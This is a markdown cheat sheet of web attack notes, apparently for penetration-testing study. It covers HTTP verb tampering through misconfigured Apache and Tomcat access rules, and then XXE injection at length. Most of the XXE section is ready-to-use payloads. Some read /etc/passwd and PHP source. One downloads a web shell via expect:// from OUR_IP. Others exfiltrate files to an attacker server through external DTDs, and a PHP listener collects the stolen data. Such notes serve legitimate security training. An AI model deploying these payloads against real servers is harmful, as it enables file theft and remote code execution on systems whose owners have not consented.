# Web Attacks

## HTTP Verb Tampering

HTTP verb tampering occurs when a web server or application applies authorization or input validation rules to only specific HTTP methods. By switching to a different verb, an attacker may bypass authentication or security filters.

### Example: Insecure Apache Configuration

```xml
<Directory "/var/www/html/admin">
    AuthType Basic
    AuthName "Admin Panel"
    AuthUserFile /etc/apache2/.htpasswd
    <Limit GET>
        Require valid-user
    </Limit>
</Directory>
```

In this configuration, access control is enforced **only** for `GET` requests. As a result:

* `POST`, `HEAD`, `OPTIONS`, or other HTTP methods are **not** protected.
* An attacker may access `/admin` using an unprotected method.

Even if both `GET` and `POST` are specified, any omitted methods may still allow access unless explicitly denied.

### Example: Insecure Tomcat Configuration

```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>
    </web-resource-collection>
    <auth-constraint>
        <role-name>admin</role-name>
    </auth-constraint>
</security-constraint>
```

Here, the security constraint applies only to `GET` requests. Other HTTP methods may bypass authentication entirely.

---

## IDOR (Insecure Direct Object Reference)

*To be completed.*

---

## XXE (XML External Entity Injection)

XXE vulnerabilities occur when an application processes XML input insecurely, allowing attackers to define and reference external entities.

### Testing for XXE

To test for XXE, inject a simple DTD into the XML input:

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Then reference the entity in an XML field:

```xml
<email>&company;</email>
```

If `Inlane Freight` is reflected in the response, the application may be vulnerable.

### Forcing XML Instead of JSON

Some applications use JSON by default but still accept XML. You can try:

* Changing the `Content-Type` header to `application/xml`
* Converting the JSON payload to XML

### Reading Local Files

If XXE is confirmed, local files may be read using system entities:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

### Reading Source Code (PHP)

Special characters may break XML parsing. For PHP applications, files can be Base64-encoded before being returned:

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

---

### Remote Code Execution via `expect` (PHP)

If the PHP `expect` module is enabled, it may be possible to execute system commands.

Example: downloading a web shell from an attacker-controlled server:

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
  <email>&company;</email>
</root>
```

---

### Using CDATA to Handle Special Characters

To avoid XML parsing issues caused by special characters, files can be wrapped in `CDATA` sections.

#### Internal DTD Payload

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
```

Because internal and external entities cannot always be concatenated directly, an **external DTD** is used.

#### External DTD (`xxe.dtd`)

```bash
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

#### Referencing the Joined Entity

```xml
<email>&joined;</email>
```

---

### Error-Based Data Exfiltration

In some cases, sensitive data can be leaked via error messages.

#### External DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

#### XML Payload

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

---

## Blind Data Exfiltration (Out-of-Band XXE)

If the server does not return XML output, data can still be exfiltrated using outbound requests.

### External DTD

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

The server sends the encoded file contents to the attacker via an HTTP request.

### Listener (PHP)

```php
<?php
if (isset($_GET['content'])) {
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Run the listener:

```bash
php -S 0.0.0.0:8000
```

### XML Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>
  <email>&company;</email>
</root>
```
